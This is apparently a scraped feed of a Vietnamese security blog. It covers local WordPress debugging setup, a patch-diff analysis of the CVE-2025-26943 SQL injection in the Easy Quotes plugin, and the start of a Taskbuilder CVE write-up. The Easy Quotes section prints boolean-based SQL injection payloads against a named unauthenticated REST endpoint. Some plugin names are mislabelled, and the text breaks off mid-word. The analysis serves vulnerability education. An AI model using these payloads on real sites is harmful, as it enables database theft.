disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c 